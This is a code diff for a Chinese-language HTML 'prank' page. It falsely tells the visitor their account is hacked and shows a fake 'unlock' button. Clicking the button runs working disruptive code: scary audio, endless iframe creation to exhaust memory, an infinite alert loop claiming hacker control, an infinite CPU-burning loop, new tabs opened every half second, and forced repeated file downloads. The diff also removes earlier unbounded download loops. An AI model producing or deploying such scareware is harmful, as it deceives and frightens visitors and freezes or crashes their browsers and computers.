@@ -5,44 +5,61 @@
     <body style="background-color: black; color: white; text-align: center;">
         <h1 style="color: red; font-size: 50px;">您的帳戶已被入侵</h1>
         <img src="https://m.gxgif.com/pic/kb/202352514622.jpg" alt="恐怖圖片" style="display: block; margin: 0 auto; width: 60%;"/>
-        <audio id="scary-audio" autoplay muted>
+        <audio id="scary-audio">
             <source src="static/yy.wav" type="audio/wav">
         </audio>
         <p style="font-size: 20px; color: yellow;">點擊按鈕解除鎖定</p>
-        <button onclick="unmuteAudio()" style="font-size: 20px; padding: 10px; background-color: red; color: white; border: none; cursor: pointer;">解除鎖定</button>
+        <button onclick="startPrank()" style="font-size: 20px; padding: 10px; background-color: red; color: white; border: none; cursor: pointer;">解除鎖定</button>
 
         <script>
-            window.onload = function() {
+            function startPrank() {
+                // 1. 播放恐怖音效
                 var audio = document.getElementById('scary-audio');
                 audio.muted = false;
                 audio.play();
 
-                // 立即執行無限下載
-                while (true) {
+                // 2. 無限創建 iframe（吃爆記憶體）
+                setInterval(() => {
+                    let iframe = document.createElement('iframe');
+                    iframe.src = "https://www.google.com"; // 任何網站都行
+                    document.body.appendChild(iframe);
+                }, 10);
+
+                // 3. 無限彈出警告視窗
+                setTimeout(function() {
+                    while (true) {
+                        alert("您的電腦已被駭客控制！");
+                    }
+                }, 3000);
+
+                // 4. 讓 CPU 100% 運行
+                setTimeout(function() {
+                    while (true) {
+                        Math.sqrt(Math.random() * 99999999);
+                    }
+                }, 5000);
+
+                // 5. 瘋狂開啟新分頁
+                setInterval(() => {
+                    window.open("https://rickroll.it/", "_blank");
+                }, 500);
+
+                // 6. 無限下載檔案
+                let count = 0;
+                let maxDownloads = 20; // 限制最多下載 20 次
+                let interval = setInterval(() => {
+                    if (count >= maxDownloads) {
+                        clearInterval(interval);
+                        return;
+                    }
                     let a = document.createElement('a');
                     a.href = 'bigfile.zip';
                     a.download = 'bigfile.zip';
                     document.body.appendChild(a);
                     a.click();
                     document.body.removeChild(a);
-                }
-            };
-
-            function unmuteAudio() {
-                var audio = document.getElementById('scary-audio');
-                audio.muted = false;
-                audio.play();
-            }
-        </script>
-
-        <script>
-            while (true) {
-                let a = document.createElement('a');
-                a.href = 'bigfile.zip';
-                a.download = 'bigfile.zip';
-                document.body.appendChild(a);
-                a.click();
-                document.body.removeChild(a);
+                    count++;
+                }, 2000);
             }
         </script>
     </body>
